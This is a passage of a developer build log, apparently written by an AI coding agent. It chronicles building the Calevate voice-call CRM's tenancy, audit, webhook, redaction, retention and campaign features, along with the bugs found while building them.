# Calevate — Build Log (running tracker)

Purpose: a durable, chronological record of what has actually been **built** in this
repo, so a future session (human or agent) can pick up without re-reading every diff.
The blueprint in `docs/` says what we intend; this file says what exists.

Conventions:
- Newest session at the top. One section per session, dated.
- Every entry names the files touched and the doc/decision it implements.
- "Verified" means a command was run and passed; anything else is "written, unverified".

---

## Session 2026-08-10 — M1 backend slice

Branch: `claude/app-building-session-r1v5j9`

### Starting state

`b2df75f` — blueprint docs complete, M1 **DB core only**: SQLAlchemy models for 29
tables, one migration (`05bba2f3c19c`) with FORCEd RLS + append-only triggers, RLS
tests, seed script, three guardrail scripts. No routes, no services, no adapters, no
workers, no frontend beyond the Next.js scaffold.

### Local environment (this container)

Docker Hub blobs are blocked by the outbound proxy (403 from CloudFront), so
`docker compose up` cannot pull `pgvector/pgvector:pg16`. Worked around with the
distro packages that are already installed:

- Postgres 16 cluster `16/main` moved to **port 5433** (matches `.env.example`),
  roles `calevate` (owner) + `calevate_app` (NOSUPERUSER NOBYPASSRLS) created, database
  `calevate` created, `alembic upgrade head` applied — 29 tables live.
- `redis-server --port 6380 --daemonize yes`.
- pgvector is **not** installed and is not needed: D-28 moved RAG to a managed service,
  and the migration creates no vector columns.

Reproduce with: `scripts/dev_bootstrap.sh` (added this session).

### Built this session

**1. API foundation — `apps/api/core/`** (BACKEND-PATTERNS §2/§3/§6/§8)

| File | What it is |
|---|---|
| `core/settings.py` | Bootstrap-env gate (DSN class only, fail fast) + cached `Settings` + `runtime_config_missing_keys()` (the readiness gate tolerant worker boot defers to) |
| `core/logging.py` | JSON formatter with the redaction path list; `redact_text` (E.164-shaped runs) + `redact_mapping` (depth/length capped) — the pair that backs hard rule 6, the Langfuse hook and the serializer guardrail |
| `core/context.py` | `correlation_id` contextvar + `Principal` (ids only, `impersonating` flag per D-22) |
| `core/errors.py` | RFC-9457 ladder: `ProblemError` with `kind/retryable/remediation/trace_id/fields`, `InvalidStatusTransitionError`, handlers for validation/HTTP/unhandled. 500s log detail + alert, return a generic body |
| `core/alerting.py` | One `alert()` with the `failure_stage` enum + the named metric recorders (`record_webhook_ack_ms`, `record_pipeline_lag`, `record_outbox_lag`, …) |
| `core/middleware.py` | Security headers → CORS → body limit → rate limit → load-shed → correlation id, added in reverse so the documented order is the runtime order |
| `core/loadshed.py` | Load-shed guard: 5s memo → Redis → Postgres, `ALWAYS_ALLOWED_PREFIXES` so an operator can never lock themselves out |
| `core/health.py` | `/healthz/live`, `/healthz`, `/healthz/ready` with the priority-ordered `degradation_mode` and ARQ queue-staleness |
| `core/redis.py`, `core/bootstrap.py` | Lazy Redis client; `create_app()` implementing the locked bootstrap order (shared by api + voice-runtime, `minimal=True` for the latency path) |

**2. Auth, RBAC, tenancy** (D-37, D-22, BACKEND-PATTERNS §7)

- `core/auth.py` — Clerk JWKS verification per realm (a client token can never mint an
  admin principal), principal loading from OUR `users`/`memberships`/`admin_users`,
  `deactivated_at` re-checked every request, `requires(permission)` dependency, and a
  local-only `dev:<realm>:<id>` token that requires BOTH `APP_ENV=local` AND no Clerk
  secret for that realm.
- `core/rbac.py` — permission vocabulary, role→permission table, `MUTATING_PERMISSIONS`
  (an impersonating admin is refused all of them — D-22 read-only), and
  `assert_policy_registry_complete(app)` which fails the **boot** if a mounted route
  declares no permission.
- `core/deps.py` — `db` (tenant-scoped session, RLS does the isolation) and `global_db`.
- `compliance/audit.py` — audit writer with the HMAC hash chain, serialized by
  `pg_advisory_xact_lock('audit:chain')` on the caller's transaction; the head is the
  last row of `audit_log` and is cached nowhere (D-59 — a lease cannot bound a
  transaction, and a cached head is erased by the ROLLBACK that erases the row it names).
  `verify_chain()` walks the whole log by default and reports how far it got. Writes in
  the CALLER's transaction so an audited read and its record commit together. Summaries
  go to the log stream, not the hashed payload (no summary column ⇒ hashing it would
  make the chain unverifiable).

**3. Reliability triad — `reliability/service.py`** (BACKEND-PATTERNS §4/§5)

Idempotency (scope_key = HMAC of tenant/user, never raw ids; key+different body → 409;
in-flight → 409; failed → CAS retry), transactional outbox (`enqueue_outbox` in the
caller's transaction, `claim_outbox_batch` with `FOR UPDATE SKIP LOCKED`, DLQ at 5
attempts + alert, `replay_dead_letters`), webhook inbox (claim on arrival, same
event_key + different payload_hash → 409 **and** an alert, failed rows re-claimable).

**4. Schema changes — migration `769a9152cb06`**

- `platform_state` (singleton): durable load-shed mode + the big red switch, seeded.
- `users.deactivated_at`.
- **Repair:** `agents.system_prompt_id → prompt_versions` and
  `agents.extraction_schema_id → extraction_schemas` never existed in the database.
  Alembic silently drops `use_alter=True` constraints declared inside `op.create_table`,
  so migration `05bba2f3c19c` created the columns without the FKs. Found by
  autogenerating against a migrated DB and reading the diff. Added as explicit ALTERs.
- New settings: `CLERK_FRONTEND_API` (JWKS host, D-37 custom domain), `AUDIT_CHAIN_SECRET`.

**5. Engine adapters + conformance** — `apps/api/engine/`, `packages/shared/`

`calevate_shared/engine.py` now carries the FULL contract in our vocabulary
(`AgentConfig`, `CallContext`, `NumberSpec`, `KBSourceRef`, `CostBreakdown`,
`ExecutionSnapshot`, `WebhookVerdict`), so a second engine is a change in
`apps/api/engine/` and nowhere else. `bolna.py` encodes the three vendor facts that
shape the design (unsigned at-most-once webhooks → `verify_webhook` reports
`method="source_ip"` and never claims proof; cost/recording/transcript only at
`completed` → `billable_ready`; USD cents → INR at capture with the fx rate stamped).
`fake.py` is a real second implementation with a call lifecycle and rate-card costs.
Conformance suite: 11 clauses × 2 adapters, no network.

`CallEvent` no longer declares `tenant_id`/`agent_id` as required — an adapter cannot
know them and must never invent them (hard rule 1); they are resolved from
`engine_agent_ref`.

**6. voice-runtime receiver** — `apps/voice-runtime/`

`engine_intake.py` is the deliberately tiny twin (source-IP allowlist, trusted-proxy
handling so a forged `CF-Connecting-IP` cannot walk through the allowlist, and the
three fields needed to dedupe). `webhook_routes.py` verifies → dedupes (Redis fast path
+ durable inbox claim) → writes ONE forensic row → enqueues ARQ → acks, measuring
`X-Ack-Ms` and alerting when it breaches hard rule 3's 500ms.

**7. Workers** — `apps/workers/`

- `redaction.py` — Aadhaar (Verhoeff), PAN, card (Luhn), OTP, email/UPI, Indian mobile
  (keeps last 2 digits), and **spoken digit runs in English + transliterated Telugu**,
  which a regex alone cannot see. 10 behaviour tests.
- `extraction.py` — Sarvam (D-36; and per D-127 G-7 the permanent runner of the first
  post-call extraction, because that pass reads the raw transcript) / Offline
  deterministic / `VertexGeminiExtractor` on Vertex AI `asia-south1` for the
  user-triggered assist over the REDACTED copy, on `gemini-2.5-flash` — 2.5 because
  `asia-south1` is the only region D-127 permits and no 3.x model is reported there, which
  makes BRD R-04's 16 Oct 2026 retirement live for this leg (`GEMINI_DEFAULT_LLM_RETIRES`,
  OPERATIONS §2 gate 14b). `GEMINI_EXTRACTION_DEFAULT is False`, and
  `GEMINI_MODEL_CONFIRMED_IN_REGION is False` — a 404 on the first real call is the answer
  to the one vendor fact nobody here could read, and the client logs it as
  `vertex_model_not_served_in_region` rather than as `HTTPStatusError` (D-142).
  No silent failover between providers — and `assist_capability()` is the one place that
  decides between a DISCLOSED Sarvam fallback and a refusal with a remediation (G-6).
- `pipeline.py` — `ingest_engine_event` (re-fetches the truth, resolves tenant, upserts
  the call, gates on `billable_ready`) and `run_post_call_pipeline` (recording FIRST →
  transcript+redaction → extraction → lead upsert → metering → outbox notification),
  plus `reconcile_executions` (the 10-min guarantee of record).
- `storage.py`, `notifications.py`, `dispatcher.py` (outbox publish + DLQ metrics +
  stalled-pipeline alert), `settings.py` (jobs + 4 crons, tolerant boot).
- `core/queue.py` — ARQ pool with the `job:<natural key>` id convention, so a duplicate
  webhook and a poller rediscovery collapse into one job before a worker runs.

**8. Second architectural gap found by running it: `engine_agent_routes`**

An engine webhook arrives with the VENDOR's agent id, no session and no tenant — so
resolving it is inherently a cross-tenant read, and `agents` is FORCE-RLS'd. The smoke
test failed with `engine_agent_unmapped`, which was the right failure. Rather than
exempt `agents` from RLS or run the resolver as the owner role, added a deliberately
global routing table (`engine`, `engine_agent_ref`) → (`tenant_id`, `agent_id`), no PII,
registered in `RLS_EXEMPT_TENANT_COLUMNS` with that reason. Migration `fa06ed03b49d`.

**9. Two smaller fixes the tooling forced**

- `validate_bootstrap_env` read only `os.environ`, so it rejected a valid local setup
  that keeps its DSNs in `.env` — the very file Pydantic Settings reads. It now checks
  the same sources with the same precedence.
- The import-linter engine contract was refined: forbid DIRECT imports of vendor adapter
  modules (`allow_indirect_imports = true`) instead of forbidding `apps.api.engine`
  wholesale. The old form banned workers from having an engine at all, which the
  post-call pipeline and poller cannot do without. The rule is about vendor payload
  shapes, not about the word "engine".

**Verified this session:** 22 conformance + 10 redaction + 3 smoke + 6 RLS/scaffold
tests pass; both import-linter contracts KEPT; RLS coverage 20/21 policied, 2 exempt
with reasons; env parity OK.

**10. API surface — 21 routes, every one permission-declared**

- `crm/` (schemas + service + routes): dashboard, calls list/detail, **raw transcript
  behind `calls:read_raw` with an audit row written in the same transaction**, presigned
  recording links, leads list with schema-driven columns travelling alongside the rows,
  lead patch with a timeline event, CSV export, and the D-21 "call this lead" button —
  idempotent, and gated by the compliance gate which returns a *decision* so the UI can
  explain a refusal rather than silently disabling a button.
- `compliance/service.py` — the ONE gate every dispatch path calls: big red switch →
  spend cap → agent live/disclosure/direction → calling hours (IST) → DNC (read live,
  never cached, because additions must land before the next dispatch tick). No bypass
  flag exists, deliberately.
- `agents/` — publish writes `engine_agent_ref` AND the routing row in one transaction;
  `dispatch_call` is the single outbound entry point.
- `tenancy/routes.py` (`/v1/me`), `ops/routes.py` (big red switch + load-shed mode with
  step-up confirmation, outbox DLQ replay, audit-chain verification).
- New table: `dnc_list` (migration `17a91a69dee9`) with a **hand-written asymmetric RLS
  policy** — READ includes global entries (a nationally suppressed number a tenant
  cannot see is a number they keep dialling), WRITE does not (or any tenant could
  suppress a number platform-wide).

**11. Third architectural gap: authentication could not read its own memberships**

Writing the API auth tests surfaced the same shape of problem a third time. To scope a
session to a tenant we must first ask "which tenants is this user in?" — but
`memberships` and `organizations` are FORCE-RLS'd on the tenant id we do not have yet,
so every legitimate member got a 403.

Fixed by adding a second, narrower GUC (`app.user_id`, migration `8c31d0f4ab27`) that
widens **reads** by exactly one clause — your own membership rows and the organizations
they point at — and widens **writes** by nothing. Three RLS tests pin that down,
including that the user GUC does not unlock tenant business data.

**12. A guardrail that was silently checking nothing**

`assert_policy_registry_complete` iterated `app.routes` looking for `APIRoute`
instances. FastAPI 0.140 stopped flattening `include_router` at mount time — `app.routes`
now holds opaque `_IncludedRouter` wrappers — so the boot assertion was inspecting only
the four built-in doc routes and passing trivially. Now walks nested routers (21 routes
found), and **fails loudly if it ever finds zero**, because a guardrail that checks
nothing is worse than no guardrail. Two tests cover the guardrail itself.

**Verified:** 58 tests pass · both import contracts KEPT · RLS 21/22 policied, 2 exempt
with reasons · env parity 24 keys · ruff + format clean.

**13. Client app v1 — `apps/web`** (D-24, D-10, D-21, D-22)

- `lib/api/client.ts` — the ONE place `fetch` appears, so auth/org headers and
  problem+json handling cannot be forgotten screen by screen. `ApiProblem` keeps
  `kind`/`retryable`/`remediation`/`fields`, which is what lets a compliance refusal
  render as an explanation instead of "something went wrong".
- `lib/api/schema.d.ts` — generated from the API's own OpenAPI (19 paths);
  response types are aliased from it so they cannot drift.
- `lib/api/hooks.ts` — TanStack Query with **polling** (D-24: not WebSockets, SSE
  deferred to M3); 20s on live surfaces, 60s on leads, refetch-on-focus. Mutations
  never auto-retry — the safety net is the server's `Idempotency-Key` handling.
- Screens: `/c/<slug>` dashboard (incl. the after-hours tile that is D-38's whole sales
  argument), calls list, call detail (redacted transcript + captured fields), leads
  table whose **columns come from the API alongside the rows** (TRD §7), inline status
  changes on the fixed enum, CSV export.
- `Providers` retries only `retryable` problems — a 403 or a DNC block fails the same
  way forever, so retrying it just delays the message.

Verified by driving the real stack: API on :8000, web on :3000, four calls pushed
through the actual webhook → pipeline → extraction path. Screenshots show the
schema-driven Leads columns, masked phones, and live dashboard aggregates.

**14. A bug only a browser could find: CORS preflight**

`X-Org-Slug` (tenant selection) and `X-Impersonate-Org` (D-22 view-as) were not in the
CORS `allow_headers` list, so every browser request failed its preflight while curl
kept working perfectly. The header names now live in `core/context.py` — a leaf module
both the auth dependency and the CORS config import — because a mismatch between those
two is invisible to every test that does not use a real browser.

**Local run recipe** (this container): `bash scripts/dev_bootstrap.sh`, then
`uv run uvicorn apps.api.main:app --port 8000` and
`NEXT_PUBLIC_API_BASE_URL=http://localhost:8000 pnpm -C apps/web dev`.

**15. Regression harness v1 — `scripts/eval.py` + golden fixtures**

D-15 sells regression-on-every-change as a differentiator, so the harness has to be
honest about what it measured rather than flattering.

- `tests/fixtures/golden_transcripts.json` — the mandatory five (OPERATIONS §3) plus a
  PII case, written in the **code-mixed romanized Telugu** Saaras actually returns. A
  fixture in clean English would pass while the product failed.
- Each case scores **capture** (`expect`) AND **restraint** (`expect_absent`). The
  second half matters more: a model that fills every column with plausible guesses
  scores well on capture and poisons a client's CRM. The out-of-scope case exists
  specifically to catch an invented `intent`.
- Compliance and redaction are checked per case: disclosure spoken in the opening turn,
  DNC request acknowledged, and `must_redact` values gone — including the digits, so a
  spoken-out number cannot be reassembled.
- **The gate is a RATCHET, not a pass/fail.** The offline extractor cannot read Telugu
  numerals, so an absolute gate would be permanently red and stop being read. A
  per-model baseline of known failures is committed (`eval_baseline.json`), and exit
  code 1 means "a case that used to pass now fails". `--update-baseline` makes an
  improvement a reviewable diff. Baseline is keyed BY MODEL because comparing Sarvam
  against Gemini on these fixtures is exactly the question D-36 opened and D-127
  deliberately did NOT close: D-127 decides WHERE Gemini runs and WHICH pass it may see,
  never which model extracts better. That run is blocked outside this repo on a Sarvam
  key and egress.
- Current baseline (`offline-heuristic`): 3/6 pass. The three failures are real Telugu
  comprehension limits — "iddaru" → 2, "marchali" → reschedule, "tarvata call cheyandi"
  → callback — and are precisely what a real model has to beat.
- `tests/eval_harness_test.py` tests the gate itself, including that compliance and
  redaction cases must pass on EVERY model (they are our code, not the model's).

**16. Admin realm — `apps/api/admin/`** (FLOWS §1/§2, D-22, D-38)

- `create_organization` — wizard steps 1 + 4 in ONE transaction: org, **retention
  policies immediately** (the 90-day recording floor is a legal obligation from the
  first call, not from whenever it gets configured), an inbound receptionist agent in
  `draft` with a non-removable disclosure line, and an extraction schema seeded from
  the vertical template. A half-created tenant is worse than none, because the pipeline
  would happily process calls for it.
- Invitations: single-use, 72h, **hashed at rest**, burned by CAS on `used_at IS NULL`
  so two clicks on one emailed link produce one membership.
- `/v1/admin/tenants` health list, `/v1/admin/tenants/{id}/impersonate` which mints NO
  credential — the admin keeps their own token and adds the header, so the audit trail
  is never ambiguous about who acted.

**17. Fourth cross-tenant read: the client directory (`app.admin`, `b57e2f9c4a13`)**

Same shape as the previous three, and it gets the narrowest fix that works: `app.admin`
widens `USING` on **`organizations` only** and widens `WITH CHECK` nowhere. An admin
listing clients is not an admin reading transcripts — for tenant data they enter the
tenant through impersonation, which sets `app.tenant_id` normally, is read-only, and is
audited per page view.

Consequence accepted: `tenant_overview` is N+1 by construction (directory from the
admin session, counts from a per-tenant session). At M1 scale that is a handful of fast
counts, and the alternative was widening RLS across every tenant table for a dashboard.
Four tests assert the narrowness directly — leads, calls and transcripts must all
return zero under `app.admin`, and it must grant no writes.

Also fixed: a wrong-realm `dev:` token fell through to JWKS and answered 502
"auth not configured", telling the caller about our deployment instead of about their
token. It is a 401 now.

**18. Knowledge base — `apps/api/kb/`** (FLOWS §7, D-28, D-33)

Tables `kb_sources`, `kb_documents`, `kb_retrieval_logs` (migration `842ba923796d`,
all FORCE-RLS'd). **`kb_chunks` + pgvector + HNSW are deliberately NOT created**: D-28
moved retrieval to a managed service and made them contingency, and D-33 keeps v1
in-call retrieval on the engine's built-in KB, which is not a BYOK slot. Chunks are
stored as TEXT for preview and for the dual-push payload; provider ids go in
`kb_documents.meta` so a DPDP erasure can prove it removed both copies.

Workflow: client submits (`kb:write`) → paragraph-aware chunking capped at ~700 chars
(a chunk cut mid-sentence becomes a sentence the agent reads aloud badly) → preview →
**admin approves** (`agents:write`, realm=admin) → publish pushes to the engine BEFORE
flipping the local active flag, so a rejected push never leaves our dashboard claiming
the agent knows something it does not. Publishing archives the prior version rather
than editing it, which makes rollback a republish. Approve/reject are CAS on
`pending_approval`. 7 tests.

The gate is not bureaucracy: the agent speaks under the client's own PE registration,
so changing what it says changes a legal instrument.

**19. Admin console — `apps/web/src/app/admin/`** (TRD §11, D-22, FLOWS §1/§7)

A separate route group with its own session helper (`lib/api/admin.ts`) and its own
dark visual language. Both separations are deliberate: a `realm` flag on one shared
session is one bad conditional away from an admin token on a client surface, and an
operator with cross-client reach should never be one glance from believing they are
inside a client's own dashboard.

Screens: client health table with a "view as" link, the new-client wizard (steps 1 + 8,
with the pilot-gated steps listed as *still manual* rather than rendered as dead
buttons), the operations page (current state shown prominently — the failure mode of a
kill switch is forgetting it is on — with a typed confirmation matching the API's
step-up header), and per-client KB approval with chunk-by-chunk preview.

**20. A deadlock caught while wiring the console**

KB approve/reject/publish were on the client-realm router, which meant an admin could
only reach them with a tenant context — and the only way an admin gets one is
impersonation, which is READ-ONLY by D-22. They were permanently un-callable. Moved to
`/v1/admin/tenants/{tenant_id}/kb/{source_id}/…`, which is exactly what D-22 prescribes
("mutations still go through admin surfaces") and makes each approval self-documenting
in the audit log. A route-layout test now asserts the split so it cannot regress: the
queue is READ through impersonation, DECIDED through the admin surface.

Also fixed: the shared `Card` only goes dark under `prefers-color-scheme`, so it
rendered as a white slab inside the admin shell. Admin panels are styled locally, with
a comment saying why rather than leaving a mystery duplicate.

**21. Clerk mirror — `apps/api/tenancy/clerk_webhooks.py`** (D-37)

The decision made concrete: **Clerk authenticates; it does not own our data model.**
`user.created/updated/deleted` are mirrored into OUR `users` table so RLS keeps keying
off OUR ids, and replacing Clerk would move token verification only.

- **Svix signature verified directly** rather than via the SDK — thirty lines of HMAC
  over a documented format, against a new dependency in the auth path. Constant-time
  compare, all signatures in the header checked (secret rotation), and a 5-minute skew
  window so a captured request is not replayable forever.
- **Fails CLOSED with no secret configured.** This endpoint writes to the table the
  membership lookup keys off, so an unverifiable identity feed is an account-creation
  primitive — worse than no feed at all.
- **Delete deactivates, never removes**: a hard delete would orphan memberships and
  audit rows that must survive (hard rule 4), and `deactivated_at` is what the auth
  guard re-checks per request, so the effect is immediate regardless.
- Organization events are acknowledged and ignored: orgs come from OUR onboarding
  wizard (D-10, admin-driven), and inventing a tenant from an upstream event would be
  exactly the wrong direction of trust.
- 8 tests, mostly adversarial: tampered body, stale timestamp, missing headers,
  rotation, unsigned request, replay dedupe.

**22. Retention + DPDP erasure — `apps/workers/retention.py`** (SEC-COMP §4, FLOWS §9)

`retention_policies` and `deletion_requests` existed as tables with nothing acting on
them, which makes the DPA a promise rather than a control. Now:

- **Nightly retention sweep** per tenant, per category. The TRAI 90-day recording floor
  is enforced a second time here — a DB CHECK stops anyone configuring less, and this
  job refuses to act on a policy that somehow claims less, because deleting early is
  the violation that cannot be undone.
- **Anonymize over delete**, deliberately: deleting a call row would take its
  `usage_events` with it (FK RESTRICT) and silently rewrite a billing period. The
  personal data is neutralized and the countable shell stays — the minutes happened.
- **Erasure with proof**: locate a number across calls, turns and leads, erase, and
  write a certificate recording what, where, when and per-row HASHES. The proof
  deliberately does not contain the number — a certificate that carries the data it
  says was removed defeats itself. Idempotent, so a re-run cannot overwrite the
  original with a weaker one.
- **What survives is as tested as what goes**: `usage_events` and `consent_ledger`
  both remain. The consent record is the proof the calls were lawful; deleting it to
  satisfy an erasure request would destroy the evidence.
- Engine-side deletion is marked `unconfirmed_pending_vendor_api` rather than asserted:
  Bolna's deletion API is undocumented (pilot gate), and a proof that overclaims is
  worse than one that states its limits. 6 tests.

**23. Notification transport — `apps/workers/transport.py`**

Three implementations behind one Protocol, selected by config: SMTP (any provider —
keeps the vendor a deployment decision, not a dependency), a console sink for local
dev that reports SUCCESS because the message really did arrive somewhere, and a
`NullTransport` for an unconfigured non-local deployment that reports **FAILURE and
says why**.

The last one is the reason the module exists. A transport that returns success with
nothing wired makes the 2-minute hot-lead SLO look met in every dashboard while no
client is ever told. The delivered flag is recorded on the lead timeline either way, so
"the alert was sent" is a checkable claim rather than an assumption. Recipient
**domains** are logged, never mailboxes.

**24. Observability — `apps/api/core/observability.py`**

Bootstrap step 3 ("tracing init before the app exists") is now filled rather than
marked. Sentry is config-gated, tolerant of a missing SDK, and stamps the release so a
report names the deploy that produced it.

The non-optional half is the **redaction hook**. An error tracker is a searchable log
with attachments, and Sentry captures local variables and request bodies by default —
which on this codebase means capturing a transcript the first time anything throws
inside the post-call pipeline. `scrub_event` drops the body outright, redacts headers
(auth, tenant, Svix signature), masks query strings (the leads filter takes a phone
suffix) and scrubs stack-frame locals — reusing the SAME primitives as the logger so
the two cannot drift. `redact_trace_payload` is the Langfuse seam CLAUDE.md requires.

Six tests, including the one that actually bites: a pipeline frame holding the
transcript it was mid-way through redacting. Ids survive, PII does not, and an event is
never dropped entirely — scrubbing degrades the detail, not the signal.

*Added later in the same module, and never written up until §48 went looking for what
the docs did not say:* **the OTel half of TRD §2 shipped too, and it crosses every hop.**
HTTP span → producer span at enqueue → the W3C traceparent inside the ARQ job payload
(`TRACE_KWARG`) → consumer span → engine and Postgres round trips, one trace id. The
queue hop is the one that mattered and it is tested against real Redis — the job is read
back out and asserted to carry the root's id — because a trace that stops at a process
edge answers nothing about "where did the two minutes go". Sampling is
`ParentBased(TraceIdRatioBased)` at 0.1, and ParentBased is the non-negotiable half: a
per-process sampler re-rolls at every hop, so 10% of 10% across four processes is a
backend full of orphans. It is config rather than code because the first thing an
operator does in an incident is set it to 1.0, and that must be a restart, not a deploy.
Three PII decisions are load-bearing: span attributes are an ALLOWLIST (a denylist on a
tracing API fails open), the "is this a phone number" verdict comes from the logger's own
`redact_text` so the two cannot drift, and httpx is patched by hand rather than with the
OTel library — that library records the full URL, and outbound webhook targets are
CLIENT-SUPPLIED URLs that can carry an api_key or a phone in a callback param. DB spans
carry a statement fingerprint and a row count, never the statement and never the
parameters. voice-runtime is instrumented on measured numbers rather than on faith
(44µs unsampled, 84µs sampled, 0.017% of the 500ms ack budget; with no collector its ASGI
chain is byte-for-byte unchanged and zero opentelemetry modules are imported, verified by
a subprocess check of `sys.modules`) — and it **refuses to trust an incoming
traceparent**, because its receiver is our only unauthenticated public write surface and
honouring a stranger's sampled flag hands them a switch that turns on 100% of our tracing
spend.

**25. The rest of D-29's critical four, plus CI**

Three guardrails were specified in ENGINEERING-PRACTICES §2 for M1 and did not exist:

- `check_redaction_exposure` — walks every response model reachable from the live
  OpenAPI and fails if a raw-PII field is exposed outside an explicitly-listed
  role-gated route. Adding an exception is a change to that list, visible in review.
- `check_ledger_immutability` — two independent checks, because there are two failure
  modes: the DB trigger exists (a migration could drop it) AND no code emits an
  UPDATE/DELETE against a ledger (the trigger would catch it, during an incident, in
  production, on the one path nobody tested).
- `check_openapi_fresh` — the committed snapshot must match the live app. It **caught
  real drift on its first run** (the Clerk webhook route), which is the whole argument
  for having it. `gen:api` was also pointed at the committed snapshot rather than at
  `http://localhost:8000` — generating from whatever server happens to be running is
  how a stale client gets committed in the first place.

`.github/workflows/ci.yml` runs all six guardrails plus lint, format, tests, mypy, the
frontend build, and the regression ratchet — with Postgres and Redis services, the app
role created as NOSUPERUSER NOBYPASSRLS (verifying RLS as a superuser verifies
nothing), and migrations applied before the RLS check reads `pg_policies`.

**26. mypy strict was failing and I had not been running it**

CLAUDE.md names `uv run mypy .` as a CI gate; 36 errors had accumulated. All fixed, and
mostly not by silencing:

- `rowcount` is declared on `CursorResult`, not the `Result[Any]` the async API returns.
  Since the CAS doctrine reads `rowcount == 0` as "another worker won" at ~12 call
  sites, the narrowing lives once in `db/result.py` with the reason attached, instead
  of a dozen `# type: ignore`s where a silenced error could later hide a real one.
- `coerce_value`'s fallthrough was provably unreachable, so it now raises instead of
  returning None — adding a member to `FieldType` without handling it is a TYPE error.
- Untyped third-party packages (boto3, botocore, sentry_sdk) are listed explicitly in
  `pyproject.toml` with a note, so the silenced set stays small and visible.

**27. Client knowledge screen — closes the FLOWS §7 loop**

`/c/<slug>/knowledge`: an owner submits text, sees the chunk preview and the review
status. The screen is deliberately honest about the approval gate rather than hiding
it — a client who does not know their change is queued submits it three more times, and
the agent speaks under their PE registration, so the wait is a property to explain, not
a delay to discover.

Driven end to end in a real browser, which surfaced two copy bugs worth fixing: the
hint promised one answer per paragraph when chunking PACKS short paragraphs up to the
size cap, and "1 answers" did not pluralize. Both are the kind of small wrongness that
teaches a client not to trust the rest of the screen.

---

## Session 2026-08-11 — D-39 schema-for-scale + invite accept

**28. Credit ledger + plan_tier — migration `f170dbce6f47`** (D-34/D-39, D-12)

The self-serve UI is M2; the SCHEMA is M1 because metering is not retrofittable.
`credit_ledger` is the fourth append-only ledger (RLS'd, immutability trigger,
registered with the guardrail), with `balance_after` denormalized so the pre-dispatch
check is one indexed read instead of an aggregate. `organizations.plan_tier`
(`managed`/`self_serve`/`trial`) is what keeps D-34's two motions one product.

Wired, not just stored: the compliance gate blocks a self-serve tenant with an empty
wallet (`no_credits`, self-serve/trial ONLY — a managed client is invoiced against a
retainer and must never be blocked by a concept that does not apply to them), and the
post-call pipeline debits the wallet per call, idempotent by call_id.

**A race the test suite caught before production did:** the first implementation used
`SELECT … ORDER BY … LIMIT 1 FOR UPDATE` to serialize concurrent charges. Under READ
COMMITTED that does not work — the second writer blocks on the newest row, then
re-checks only the ROW it locked, never re-runs the query, so it computes from the
pre-insert balance and a ₹100 wallet paid for two ₹80 calls. The concurrency test
failed exactly this way. Fixed with `pg_advisory_xact_lock` per tenant, scoped to
credit writes; the test now passes 5/5 consecutive runs. 10 tests total.

**29. Invitation accept — the last mile of FLOWS §1 step 8**

`POST /v1/invitations/accept` closes the loop: invitee signs up via Clerk (mirrored
into `users`), posts the emailed token, membership is created. Two structural pieces:

- `current_identity` — a verified client-realm user with NO membership requirement,
  because creating the membership is the point and `current_principal` would 403 them
  correctly. Listed in PUBLIC_PREFIXES with its reason.
- **Fifth lookup-before-tenant case, narrowest widening yet** (`app.invite_hash`,
  migration `c93a17d0e5b4`): the emailed token names its own tenant, so the invitation
  must be read before a tenant is known. The GUC widens READS by exactly the row whose
  token hash the caller can already name — possession of the 32-byte token IS the
  capability — and widens writes by nothing, which forces the burn + membership
  creation to happen under a normal tenant session. A test asserts the GUC shows
  exactly one row, unlocks nothing else, and grants no writes.
- Found while testing: a JOIN to `organizations` inside the invite-GUC session
  silently returned zero rows (the GUC widens `invitations` only, correctly). The slug
  is read after the tenant is known instead. Bad/used/expired tokens answer
  identically so guessing reveals nothing.

**30. Instant lead callback — `apps/api/ingest/`** (FLOWS §4, first M2 opener)

`POST /hooks/v1/ingest/{webhook_id}`: a form vendor or Meta webhook posts a lead, the
lead row ALWAYS lands, and the dial happens only if the compliance gate says yes. The
ordering is the design: a fast call to a DNC number is a violation with a timestamp,
and a lost enquiry because the gate said no is unacceptable in the other direction. A
blocked dispatch leaves a timeline entry naming the exact rule — the feed the M2
"needs attention" queue will read.

- **Config-driven field mapping** (`inbound_webhooks.mapping`): vendors rename fields
  without notice, so translation is a config row, not a release. Unmapped fields are
  dropped — unknown data from an external party does not belong in a lead row.
- **Phone normalization never guesses a country**: 10-digit Indian mobile shapes get
  +91; anything else unparseable is a 422, because dialling a wrong-country number on
  an assumed prefix is worse than losing the lead.
- **Consent provenance** (FLOWS §4): if the config names a consent field and the
  payload does not affirm it, the lead is kept and the call refused.
- **Vendor retries cannot double-dial**: payload-hash dedupe through the same durable
  inbox as every other webhook.
- **Speed-to-lead** is a named metric recorder (`speed_to_lead_seconds`, target <60s)
  from the moment the request arrives.
- Sixth lookup-before-tenant case, same doctrine (`app.ingest_webhook_id`, migration
  `d41f88a2c6e9`): the URL's UUID names exactly one config row; reads widened by that
  row, writes by nothing. The shared secret still stands between the read and any
  effect. `verify_ingest_secret` is honestly documented as the interim it is (v1
  compares `secret_ref` directly; the secrets manager + Meta's X-Hub-Signature-256
  land with DEPLOYMENT §6).

One test-suite lesson recorded: the dispatch tests failed at 05:39 IST because the
compliance gate correctly refused to dial outside calling hours — the gate working,
the tests depending on wall-clock. The suite now pins `ist_now` to 11:00 IST and says
why. 7 tests.

**31. Campaigns — `apps/api/campaigns/` + `apps/workers/campaign_dispatch.py`**
(FLOWS §5, the module hard rule 5 was written about)

Bulk outbound: draft → contacts → launch gate → dispatch ticks → retry ladder →
completed. Tables `campaigns`, `campaign_contacts`, `dlt_templates` (migration
`e16c96e68bc5`, RLS + CHECKs in the same migration). Seven endpoints under
`/v1/campaigns`, all `leads:dispatch` except progress (`leads:read`).

- **The launch gate returns NAMED blockers, not a boolean.** `GET /launch-check`
  exists so the UI can render the launch button disabled *with reasons*
  (SURFACES §2b): `agent_not_live`, `disclosure_missing`, `dlt_template_missing`,
  `dlt_template_not_approved`, `dlt_template_mismatch`, `number_missing`,
  `number_series_mismatch`, `no_contacts`. Deliberately exhaustive rather than
  fail-fast — a boolean gate produces a support ticket, a named gate produces a
  to-do list. `POST /launch` re-runs the identical check and refuses with the same
  names; the check endpoint is a preview of the gate, never a substitute (pinned by
  a test that asserts the two lists match).
- **Series ⇔ classification is enforced, not documented**: 140 dials promotional,
  160/standard dials service and transactional (DATA-MODEL §6). A mismatch is a DLT
  violation, so it blocks launch.
- **Launch scrubs; dispatch enforces.** The DNC scrub at launch marks known-blocked
  contacts terminally so the "N contacts will be dialled" number the client confirms
  is true — that is UX honesty. The dispatcher then runs the FULL compliance gate
